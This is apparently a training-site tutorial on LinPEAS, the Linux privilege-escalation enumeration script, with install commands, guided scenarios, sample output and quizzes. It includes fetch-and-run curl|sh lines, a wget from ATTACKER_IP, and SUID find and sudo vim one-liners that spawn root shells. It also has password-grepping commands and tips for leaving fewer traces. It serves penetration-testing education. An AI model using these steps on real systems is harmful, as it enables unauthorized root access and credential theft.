# LinPEAS / PEASS-ng

LinPEAS (Linux Privilege Escalation Awesome Script) is part of the **PEASS-ng** suite — the go-to tool for automated privilege escalation enumeration on Linux, Windows, and macOS. It searches hundreds of misconfigurations, weak permissions, credentials, and known CVEs that could allow an attacker (or pentester) to escalate from a low-privilege shell to root.

## Overview

LinPEAS is essential for:
- **Privilege Escalation Paths**: SUID/SGID binaries, sudo misconfigs, writable cron jobs
- **Credential Discovery**: Cleartext passwords in config files, history files, environment vars
- **System Enumeration**: OS version, kernel CVEs, installed software, running processes
- **Container/Cloud Escape**: Detect Docker, LXC, AWS/GCP/Azure metadata endpoints

### PEASS-ng Family

| Tool | Target OS | Download |
|------|-----------|---------|
| **LinPEAS** | Linux / Unix | `linpeas.sh` |
| **WinPEAS** | Windows | `winpeas.exe` / `winpeas.bat` |
| **MacPEAS** | macOS | `linpeas.sh` (macOS mode) |

### Installation

LinPEAS is a single shell script — no installation needed. Transfer it to the target or run it directly:

```bash
# Run directly from GitHub (requires internet on target)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download locally, then transfer to target
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# Transfer via SCP
scp linpeas.sh user@target:/tmp/linpeas.sh

# Transfer via Python web server (attacker machine)
python3 -m http.server 8080
# On target:
wget http://ATTACKER_IP:8080/linpeas.sh -O /tmp/linpeas.sh
```

:::command-builder{id="linpeas-builder"}
tool_name: linpeas.sh
target_placeholder: ""
scan_types:
  - name: "Default Scan"
    flag: ""
    desc: "Full enumeration with color output"
  - name: "All Checks"
    flag: "-a"
    desc: "Run all checks including slower ones"
  - name: "Super Fast"
    flag: "-s"
    desc: "Skip slower checks, fast enumeration only"
  - name: "Quiet / No Color"
    flag: "-N"
    desc: "Disable ANSI colors (good for log files)"
options:
  - name: "Save to File"
    flag: "-o /tmp/out.txt"
    desc: "Write results to a file for later review"
  - name: "Extra Enumeration"
    flag: "-e"
    desc: "Extra enumeration of files and processes"
  - name: "Network Checks"
    flag: "-n"
    desc: "Include network interface and routing info"
  - name: "Stealth Mode"
    flag: "-s -N"
    desc: "Fast and no colors — less noisy in logs"
:::

## Basic Syntax

```bash
./linpeas.sh [options]
```

**Common one-liners:**
```bash
# Default run
./linpeas.sh

# Save full output for review
./linpeas.sh -a | tee /tmp/linpeas_out.txt

# Pipe to less with color support
./linpeas.sh | less -R

# Run without writing to disk (from memory)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

:::scenario{id="scenario-1" level="beginner"}
title: "Run LinPEAS on a Compromised Host"
goal: "Execute LinPEAS on a Linux target after gaining initial access to enumerate privilege escalation paths."
hint: "Download the script, make it executable, and run it. Pipe output to tee so you can review it later."
command: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/out.txt"
expected_output: |
  ╔══════════╣ System Information
  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation
  OS: Linux version 5.15.0-91-generic
  User & Groups: uid=1000(user) gid=1000(user) groups=1000(user)

  ╔══════════╣ Sudo version
  ╚ Sudo version 1.9.9

  ╔══════════╣ SUID - Check easy privesc, exploits and write perms
  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
  -rwsr-xr-x 1 root root 88K /usr/bin/find
:::

:::scenario{id="scenario-2" level="beginner"}
title: "Transfer LinPEAS Without Internet Access"
goal: "Get LinPEAS onto a target that has no internet access using a Python HTTP server on your attacker machine."
hint: "Host the file on your attacker machine and download it from the target using wget or curl."
command: "# On attacker: python3 -m http.server 8080\n# On target:\nwget http://192.168.1.10:8080/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
expected_output: |
  --2024-01-15 10:23:11--  http://192.168.1.10:8080/linpeas.sh
  Connecting to 192.168.1.10:8080... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 847360 (828K) [text/x-sh]
  Saving to: '/tmp/linpeas.sh'
  linpeas.sh 100%[=========>] 827.50K  1.23MB/s  in 0.7s
:::

:::scenario{id="scenario-3" level="intermediate"}
title: "Find SUID Binaries for Privilege Escalation"
goal: "Identify SUID-bit binaries that can be exploited to gain root — a classic privilege escalation vector."
hint: "LinPEAS highlights SUID binaries in red/yellow. You can also run the manual find command to confirm."
command: "find / -perm -4000 -type f 2>/dev/null"
expected_output: |
  /usr/bin/find
  /usr/bin/passwd
  /usr/bin/sudo
  /usr/bin/pkexec
  /usr/lib/openssh/ssh-keysign

  # Check GTFOBins for any of these: https://gtfobins.github.io/
  # e.g. /usr/bin/find with SUID:
  find . -exec /bin/sh -p \; -quit
:::

:::scenario{id="scenario-4" level="intermediate"}
title: "Enumerate Sudo Permissions"
goal: "Check what commands the current user can run as root via sudo — often a direct path to privilege escalation."
hint: "LinPEAS checks sudo -l automatically. A (ALL) NOPASSWD entry means instant root."
command: "sudo -l"
expected_output: |
  Matching Defaults entries for user on target:
      env_reset, mail_badpass

  User user may run the following commands on target:
      (ALL) NOPASSWD: /usr/bin/vim

  # Exploit: sudo vim -c ':!/bin/bash'
:::

:::scenario{id="scenario-5" level="intermediate"}
title: "Find Credentials in Config Files"
goal: "Search for plaintext passwords in common config file locations."
hint: "LinPEAS does this automatically. You can also grep manually for 'password' in config directories."
command: "grep -r 'password' /etc /var /home --include='*.conf' --include='*.cfg' --include='*.ini' 2>/dev/null | grep -v '^Binary'"
expected_output: |
  /etc/mysql/debian.cnf:password = s3cr3tpassword
  /var/www/html/config.php:$db_password = 'P@ssw0rd123';
  /home/user/.ssh/id_rsa
:::

---

## Reading LinPEAS Output

LinPEAS uses color coding to prioritize findings:

| Color | Meaning |
|-------|---------|
| **Red** | 95%+ chance of privilege escalation |
| **Red/Yellow** | 80%+ chance — check immediately |
| **Yellow** | Interesting, investigate further |
| **Green** | Low priority / informational |
| **Blue** | Info about the system |

**Focus on red/yellow** items first. LinPEAS also includes HackTricks links next to each check for exploitation guidance.

## Key Checks LinPEAS Performs

### System & Kernel
- OS version and kernel (check for CVEs like DirtyPipe, PwnKit)
- Sudo version vulnerabilities
- Writable `/etc/passwd` or `/etc/shadow`

### SUID / SGID Binaries
- Files with the setuid bit — cross-reference with [GTFOBins](https://gtfobins.github.io/)

### Sudo Rules
- `(ALL) NOPASSWD` entries — immediate root
- Sudo version exploits (CVE-2021-3156 Baron Samedit)

### Cron Jobs
- World-writable scripts called by root cron
- Cron jobs running as root with relative paths (PATH hijacking)

### Writable Files & Directories
- Writable `/etc/passwd`
- World-writable directories in root's PATH

### Credentials
- SSH private keys in home directories
- Database credentials in web config files
- `.bash_history` with passwords
- Environment variables with secrets

### Containers & Cloud
- Running inside Docker? Check for privileged mode or mounted socket
- AWS/GCP/Azure metadata endpoint accessible?

---

## Tips & Tricks

### Avoid Writing to Disk
```bash
# Run entirely in memory — no file on disk
curl -s https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

### Filter for High-Priority Findings
```bash
# Show only red/yellow lines (most critical)
./linpeas.sh | grep -E "(\[31m|\[33m|\[1;31m)"

# Save and grep later
./linpeas.sh -N > /tmp/out.txt
grep -i "suid\|sudo\|password\|cron" /tmp/out.txt
```

### Run on Low-Resource Targets
```bash
# Fast mode skips time-consuming checks
./linpeas.sh -s
```

---

:::quiz{id="quiz-1"}
Q: What color does LinPEAS use to highlight findings with the highest chance of privilege escalation?
- [x] Red
- [ ] Yellow
- [ ] Green
- [ ] Blue
:::

:::quiz{id="quiz-2"}
Q: Which flag runs LinPEAS in "super fast" mode, skipping slower checks?
- [ ] -a
- [ ] -e
- [x] -s
- [ ] -f
:::

:::quiz{id="quiz-3"}
Q: What website should you check when LinPEAS finds a SUID binary that could be exploitable?
- [ ] Exploit-DB
- [ ] Shodan
- [x] GTFOBins (gtfobins.github.io)
- [ ] CVE Details
:::

## Quick Reference

| Command | Purpose |
|---------|---------|
| `./linpeas.sh` | Default full scan |
| `./linpeas.sh -a` | All checks (thorough) |
| `./linpeas.sh -s` | Super fast mode |
| `./linpeas.sh -N` | No color output |
| `./linpeas.sh \| tee out.txt` | Save output while viewing |
| `curl -L <url> \| sh` | Run from memory (no disk write) |
| `find / -perm -4000 2>/dev/null` | Manual SUID search |
| `sudo -l` | Check sudo permissions |

## Related Tools

| Tool | Purpose | Link |
|------|---------|------|
| **WinPEAS** | Windows privilege escalation | [PEASS-ng](https://github.com/peass-ng/PEASS-ng) |
| **LinEnum** | Older Linux enumeration script | [rebootuser](https://github.com/rebootuser/LinEnum) |
| **pspy** | Monitor processes without root | [pspy](https://github.com/DominatorVbN/pspy) |
| **GTFOBins** | SUID/sudo exploit reference | [gtfobins.github.io](https://gtfobins.github.io/) |
| **HackTricks** | Privilege escalation playbook | [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) |
